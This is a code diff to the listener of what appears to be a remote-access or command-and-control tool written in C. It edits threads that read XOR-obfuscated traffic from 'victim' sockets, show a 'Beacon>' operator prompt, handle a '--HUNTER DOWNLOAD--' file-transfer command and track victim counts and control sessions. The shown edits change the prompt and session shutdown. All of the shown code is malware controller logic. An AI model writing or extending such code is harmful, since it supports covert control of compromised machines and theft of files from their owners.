@@ -106,6 +106,9 @@ void *Socket_Reader(){
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
+	
+	if(a.kill == 0){printf("Beacon> ");}
+
 	xorbuffer = XOR(buffer, key, n, keylen);
 	if(strcmp(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
 		char* xorconfirm = XOR("OK", key, 5, keylen);
@@ -119,7 +122,6 @@ void *Socket_Reader(){
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
         fflush(NULL);
-        //printf("%d>", a.dest);
         fflush(NULL);
 	free(xorbuffer);
     }
@@ -163,9 +165,11 @@ void *Socket_Writer()
 	    	if(client_socket[i] == a.dest){
 			close(client_socket[i]);
 
+	    		a.kill = 1;
 			victim_count--;
 			client_socket[i] = 0;
 			printf("[+] Control session: %d successfully exited.\n", a.dest - 3);
+	
 		}
 				
 		else if(i == max_clients){
@@ -174,7 +178,6 @@ void *Socket_Writer()
 	    }
 
 	    free(xorbuffer);
-	    a.kill = 1;
 	    return NULL;
 	}
 	else {
